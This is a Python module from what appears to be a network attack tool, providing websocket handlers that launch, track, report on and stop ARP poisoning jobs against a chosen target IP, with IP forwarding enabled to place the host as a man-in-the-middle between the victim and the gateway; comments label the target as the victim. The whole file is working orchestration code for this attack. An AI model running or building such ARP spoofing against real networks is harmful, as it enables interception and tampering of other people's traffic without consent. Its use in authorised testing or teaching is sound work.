from netwacher.socket_handlers import send_ws_tes
from netwacher.thirdparty.scapy_a import ARPSpoofing
from netwacher.models.client import Info
import time
import uuid

info = Info()
ACTIVE_SCANS_ARP: dict[str, dict[str, any]] = {}

def arp_attack(payload: dict) -> dict:
    if not payload or "ip" not in payload:
        return None

    ip = payload["ip"]
    client_id = payload.get("client_id")
    job_id = payload.get("job_id") or str(uuid.uuid4())
    
    for existing_job_id, scan_data in ACTIVE_SCANS_ARP.items():
        if scan_data["ip"] == ip and scan_data["arp_spoof"].is_running:
            return {
                "success": False,
                "message": f"ARP attack already running for {ip}",
                "job_id": existing_job_id,
                "existing": True
            }
    
    room = client_id
    
    send_ws_tes(
        "arp_attack", 
        {
            "status": f"Arp Poison for {ip}", 
            "job": job_id
        }, 
        "arp-attack",
        room=room
    )
    
    def on_packet_callback(summary: str):
        send_ws_tes(
            "arp_attack_status",
            {
                "summary": summary, 
                "job": job_id\
            },
            "arp-attack",
            room=room
        )
        
    try:
        ip_gateway = info.get_ip_gateway()
        interface = info.get_active_interface()
        
        # Validate network info
        if not ip_gateway:
            send_ws_tes(
                "arp_attack_error",
                {
                    "job_id": job_id,
                    "error": "Could not determine gateway IP"
                },
                "arp-attack",
                room=room
            )
            return {
                "success": False,
                "message": "Could not determine gateway IP",
                "job_id": job_id
            }

        if not interface:
            send_ws_tes(
                "arp_attack_error",
                {
                    "job_id": job_id,
                    "error": "Could not determine network interface"
                },
                "arp-attack",
                room=room
            )
            return {
                "success": False,
                "message": "Could not determine network interface",
                "job_id": job_id
            }
    
        spoofer = ARPSpoofing(
            target_ip=ip,    # IP korban
            gateway_ip=ip_gateway,     # IP router
            iface=interface,
            on_packet=on_packet_callback # Interface network
        )
    
        result = spoofer.start(enable_forwarding=True, background=True)
        
        if not result["success"]:
            send_ws_tes(
                "arp_attack_error",
                {
                    "job_id": job_id,
                    "error": result["message"]
                },
                "arp-attack",
                room=room
            )
            return {
                "success": False,
                "message": result["message"],
                "job_id": job_id
            }

        ACTIVE_SCANS_ARP[job_id] = {
            "arp_spoof": spoofer,           # Instance ARPSpoofing
            "thread": result["thread"],      # Thread object
            "client_id": client_id,          # Client identifier
            "ip": ip,                        # Target IP
            "gateway_ip": ip_gateway,        # Gateway IP
            "interface": interface,          # Network interface
            "started_at": time.time(),       # Start timestamp
            "target_mac": result.get("target_mac"),
            "gateway_mac": result.get("gateway_mac")
        }
        
        send_ws_tes(
            "arp_attack_started",
            {
                "job_id": job_id,
                "target_ip": ip,
                "target_mac": result.get("target_mac"),
                "gateway_ip": ip_gateway,
                "gateway_mac": result.get("gateway_mac"),
                "interface": interface,
                "message": "ARP poisoning started successfully"
            },
            "arp-attack",
            room=room
        )
    
        return {
            "success": True,
            "message": "ARP attack started successfully",
            "job_id": job_id,
            "target_ip": ip,
            "gateway_ip": ip_gateway,
            "interface": interface
        }
    
    except Exception as e:
        error_msg = f"Failed to start ARP attack: {str(e)}"

        send_ws_tes(
            "arp_attack_error",
            {
                "job_id": job_id,
                "error": error_msg
            },
            "arp-attack",
            room=room
        )

        return {
            "success": False,
            "message": error_msg,
            "job_id": job_id
        }
    
def arp_stop(payload: dict):
    if not payload:
        return "missing payload"

    client_id = payload.get("client_id")
    job_id = None
    
    if client_id:
        for jid, rec in list(ACTIVE_SCANS_ARP.items()):
            if rec.get("client_id") == client_id:
                job_id = jid
                break
        if not job_id:
            err_msg = f"no job found for client_id={client_id}"
            return {
                "success": False,
                "message": err_msg
            }
    else:
        job_id = payload.get("job_id")
        if not job_id:
            err_msg = "missing job_id"
            return {
                "success": False,
                "message": err_msg
            }
    
    scan_data = ACTIVE_SCANS_ARP.get(job_id)
    if not scan_data:
        return {
            "success": False,
            "message": f"no active job found for job_id={job_id}"
        }
    spoofer = scan_data["arp_spoof"]
    client_id = scan_data.get("client_id")
    room = client_id
    
    try:
        # Send stopping notification
        send_ws_tes(
            "arp_attack_stopping",
            {
                "job_id": job_id,
                "message": "Stopping ARP attack and restoring ARP tables..."
            },
            "arp-attack",
            room=room
        )

        # Stop the attack
        result = spoofer.stop()

        # Remove from active scans
        del ACTIVE_SCANS_ARP[job_id]

        # Send stopped notification
        send_ws_tes(
            "arp_attack_stopped",
            {
                "job_id": job_id,
                "message": result["message"],
                "duration": time.time() - scan_data["started_at"]
            },
            "arp-attack",
            room=room
        )

        return {
            "success": True,
            "message": "ARP attack stopped successfully",
            "job_id": job_id,
            "result": result
        }

    except Exception as e:
        error_msg = f"Failed to stop ARP attack: {str(e)}"

        send_ws_tes(
            "arp_attack_error",
            {
                "job_id": job_id,
                "error": error_msg
            },
            "arp-attack",
            room=room
        )

        return {
            "success": False,
            "message": error_msg,
            "job_id": job_id
        }
        
def stop_all_arp_attacks() -> dict:
    if not ACTIVE_SCANS_ARP:
        return {
            "success": True,
            "message": "No active ARP attacks to stop",
            "stopped_count": 0
        }

    job_ids = list(ACTIVE_SCANS_ARP.keys())
    stopped = []
    failed = []

    for job_id in job_ids:
        result = arp_stop({"job_id": job_id})
        if result["success"]:
            stopped.append(job_id)
        else:
            failed.append({"job_id": job_id, "error": result["message"]})

    return {
        "success": len(failed) == 0,
        "message": f"Stopped {len(stopped)} attacks, {len(failed)} failed",
        "stopped_count": len(stopped),
        "failed_count": len(failed),
        "stopped": stopped,
        "failed": failed
    }

def arp_get_status(payload: dict) -> dict:
    if not payload:
        return "missing payload"

    client_id = payload.get("client_id")
    job_id = None
    
    if client_id:
        for jid, rec in list(ACTIVE_SCANS_ARP.items()):
            if rec.get("client_id") == client_id:
                job_id = jid
                break
        if not job_id:
            err_msg = f"no job found for client_id={client_id}"
            return {
                "success": False,
                "message": err_msg
            }
    else:
        job_id = payload.get("job_id")
        if not job_id:
            err_msg = "missing job_id"
            return {
                "success": False,
                "message": err_msg
            }
    
    scan_data = ACTIVE_SCANS_ARP.get(job_id)
    if not scan_data:
        return {
            "success": False,
            "message": f"no active job found for job_id={job_id}"
        }
    spoofer = scan_data["arp_spoof"]
    
    # Ambil status dari instance ARPSpoofing
    status = spoofer.status()
    
    # Tambahkan info dari dict
    status.update({
        "success": True,
        "job_id": job_id,
        "client_id": scan_data["client_id"],
        "ip": scan_data["ip"],
        "gateway_ip": scan_data["gateway_ip"],
        "interface": scan_data["interface"],
        "started_at": scan_data["started_at"],
        "uptime": time.time() - scan_data["started_at"],
        "thread_info": {
            "name": scan_data["thread"].name if scan_data["thread"] else None,
            "is_alive": scan_data["thread"].is_alive() if scan_data["thread"] else False,
            "ident": scan_data["thread"].ident if scan_data["thread"] else None
        }
    })
    
    return status

def arp_get_all_active() -> dict:
    return ACTIVE_SCANS_ARP